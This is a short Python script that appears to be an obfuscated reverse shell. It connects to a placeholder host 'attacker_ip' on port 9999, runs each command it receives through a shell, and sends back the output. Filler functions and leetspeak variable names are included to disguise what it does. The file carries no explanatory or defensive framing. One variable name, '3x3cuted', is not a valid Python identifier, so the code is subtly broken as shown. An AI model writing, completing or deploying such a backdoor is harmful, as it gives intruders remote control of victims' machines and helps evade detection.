import socket as s0c
import subprocess as s_proc
import time as t1m3

# Random garbage functions and variables
def useless_function_1():
    temp_var = 42
    return temp_var * 2

def useless_function_2(a, b):
    return a + b * useless_function_1()

garbage_data = "JustSomeGarbageTextForObfuscation"

def random_sleep():
    t1m3.sleep(0.5)

# Connection details (obfuscated variable names)
srv_1p = 'attacker_ip'  
srv_p0rt = 9999
cl13nt = s0c.socket(s0c.AF_INET, s0c.SOCK_STREAM)

# Connect to the attacker's machine
random_sleep()
cl13nt.connect((srv_1p, srv_p0rt))

while True:
    # Receive the command from the attacker
    try:
        cmd = cl13nt.recv(1024).decode()

        # Execute command and send the result back (obfuscated variable names)
        random_sleep()
        3x3cuted = s_proc.run(cmd, shell=True, capture_output=True)
        cl13nt.send(3x3cuted.stdout + 3x3cuted.stderr)

        # Call garbage functions
        useless_function_1()
        useless_function_2(1, 2)

    except Exception as e:
        cl13nt.send(str(e).encode())
        break

cl13nt.close()
